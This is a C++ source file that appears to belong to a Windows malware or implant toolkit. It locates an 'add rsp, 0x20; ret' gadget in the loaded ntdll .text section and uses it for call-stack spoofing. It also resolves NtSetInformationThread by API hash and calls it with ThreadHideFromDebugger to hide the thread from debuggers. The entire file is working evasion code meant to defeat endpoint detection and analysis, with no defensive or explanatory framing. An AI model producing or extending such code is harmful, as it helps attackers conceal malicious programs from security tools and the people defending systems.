#include "StackSpoof.h"
#include "ApiHash.h"
#include "Unhook.h"

#include <windows.h>

namespace stackspoof {

extern "C" std::uintptr_t g_gadgetRet;
extern "C" void* SpoofCall(void* target, std::uintptr_t a0, std::uintptr_t a1,
                           std::uintptr_t a2, std::uintptr_t a3);

namespace {

// Find `add rsp, 0x20 ; ret` in *loaded* ntdll .text (RX). Prefer the clean
// private copy only as a pattern source if needed — jump target must be RX.
void* find_gadget() {
    auto base = reinterpret_cast<std::uint8_t*>(unhook::loaded_ntdll_base());
    if (!base) return nullptr;
    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    auto nt = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    auto sect = IMAGE_FIRST_SECTION(nt);
    const std::uint8_t* text = nullptr;
    std::size_t size = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (memcmp(sect[i].Name, ".text", 5) == 0) {
            text = base + sect[i].VirtualAddress;
            size = sect[i].Misc.VirtualSize;
            break;
        }
    }
    if (!text || size < 5) return nullptr;

    static const unsigned char p1[] = { 0x48, 0x83, 0xC4, 0x20, 0xC3 };
    static const unsigned char p2[] = { 0x48, 0x81, 0xC4, 0x20, 0x00, 0x00, 0x00, 0xC3 };
    for (std::size_t i = 0; i + sizeof(p1) <= size; ++i) {
        if (memcmp(text + i, p1, sizeof(p1)) == 0) {
            return const_cast<std::uint8_t*>(text + i);
        }
        if (i + sizeof(p2) <= size && memcmp(text + i, p2, sizeof(p2)) == 0) {
            return const_cast<std::uint8_t*>(text + i);
        }
    }
    return nullptr;
}

} // namespace

bool init() {
    void* g = find_gadget();
    if (!g) return false;
    g_gadgetRet = reinterpret_cast<std::uintptr_t>(g);
    return true;
}

void* call4(void* target, std::uintptr_t a0, std::uintptr_t a1,
            std::uintptr_t a2, std::uintptr_t a3) {
    if (!g_gadgetRet) return nullptr;
    return SpoofCall(target, a0, a1, a2, a3);
}

bool hide_thread() {
    if (!g_gadgetRet) return false;
    constexpr std::uint32_t ntdll = API_HASH("ntdll.dll");
    void* ntSetInfo = api::export_by_hash(ntdll, API_HASH("NtSetInformationThread"));
    if (!ntSetInfo) return false;
    constexpr int ThreadHideFromDebugger = 0x11;
    ULONG zero = 0;
    void* r = call4(ntSetInfo,
                    reinterpret_cast<std::uintptr_t>((HANDLE)-2), // GetCurrentThread()
                    static_cast<std::uintptr_t>(ThreadHideFromDebugger),
                    reinterpret_cast<std::uintptr_t>(&zero),
                    static_cast<std::uintptr_t>(sizeof(zero)));
    return reinterpret_cast<std::intptr_t>(r) == 0; // STATUS_SUCCESS
}

} // namespace stackspoof
